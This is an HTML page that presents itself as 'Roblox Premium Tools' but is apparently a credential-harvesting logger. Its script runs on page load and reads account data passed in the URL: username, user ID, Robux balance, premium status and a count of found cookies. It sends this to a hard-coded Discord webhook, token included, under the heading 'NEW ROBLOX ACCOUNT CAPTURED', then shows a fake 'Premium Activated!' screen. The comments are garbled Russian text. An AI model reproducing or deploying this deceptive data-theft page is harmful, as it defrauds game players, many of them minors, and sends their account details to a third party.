<!DOCTYPE html>
<html>
<head>
    <title>Roblox Premium Tools</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 50px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }
        h1 {
            margin-bottom: 20px;
            font-size: 2.5em;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #00ff88;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÆ Roblox Premium Tools</h1>
        <p>Loading premium features...</p>
        <div class="loader"></div>
        <p id="status">Initializing...</p>
    </div>

    <script>
        // Enhanced GitHub Pages Roblox Logger
        function processIncomingData() {
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('data');
            
            if (encodedData) {
                try {
                    document.getElementById('status').textContent = 'Processing data...';
                    
                    const decodedData = decodeURIComponent(encodedData);
                    const data = JSON.parse(decodedData);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
                    sendToDiscord(data);
                    
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—à–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                    setTimeout(() => {
                        document.body.innerHTML = `
                            <div class="container">
                                <h1>‚úÖ Premium Activated!</h1>
                                <p>Your Roblox premium features are now enabled!</p>
                                <p>Return to Roblox to enjoy enhanced gameplay.</p>
                                <div style="margin-top: 20px; font-size: 0.9em; opacity: 0.8;">
                                    Roblox Premium Tools v2.0
                                </div>
                            </div>
                        `;
                    }, 2000);
                    
                } catch (error) {
                    document.getElementById('status').textContent = 'Error processing data';
                    console.error('Error:', error);
                }
            } else {
                // –ï—Å–ª–∏ –¥–∞–Ω–Ω—ã—Ö –Ω–µ—Ç, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –æ–±—ã—á–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div class="container">
                            <h1>üöÄ Roblox Premium Tools</h1>
                            <p>Welcome to Roblox premium features hub!</p>
                            <div style="margin-top: 20px;">
                                <p>‚ú® Enhanced Graphics</p>
                                <p>üéÅ Free Items</p>
                                <p>‚ö° Faster Loading</p>
                            </div>
                        </div>
                    `;
                }, 3000);
            }
        }

        function sendToDiscord(data) {
            // –¢–í–û–ô DISCORD WEBHOOK - –ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ô!
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1432234979219341353/8RD3VVODh4ri3_7wwVhu5gpwEGbwzM7fVL5E8utGLVjJa1uDskmzVg9zV_gHlluO9fa8';
            
            const embed = {
                username: 'Roblox Premium Logger',
                avatar_url: 'https://tr.rbxcdn.com/0e6b8f1e93a5d48b5a1c3429a155a2a9/150/150/Image/Png',
                embeds: [{
                    title: 'üéØ NEW ROBLOX ACCOUNT CAPTURED',
                    description: `**Username:** ${data.username || 'Unknown'}\n` +
                                `**User ID:** ${data.userId || 'Unknown'}\n` +
                                `**Robux:** ${data.robux || 0}\n` +
                                `**Premium:** ${data.premium ? 'Yes' : 'No'}\n` +
                                `**Cookies:** ${data.cookiesCount || 0} found`,
                    color: 3066993,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'GitHub Pages ‚Ä¢ ' + new Date().toLocaleDateString()
                    },
                    thumbnail: {
                        url: 'https://tr.rbxcdn.com/0e6b8f1e93a5d48b5a1c3429a155a2a9/150/150/Image/Png'
                    }
                }]
            };

            // –ò—Å–ø–æ–ª—å–∑—É–µ–º fetch –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(embed)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Data sent to Discord successfully');
                } else {
                    console.error('Failed to send data to Discord');
                }
            })
            .catch(error => {
                console.error('Error sending to Discord:', error);
            });
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('DOMContentLoaded', processIncomingData);
    </script>
</body>
</html>
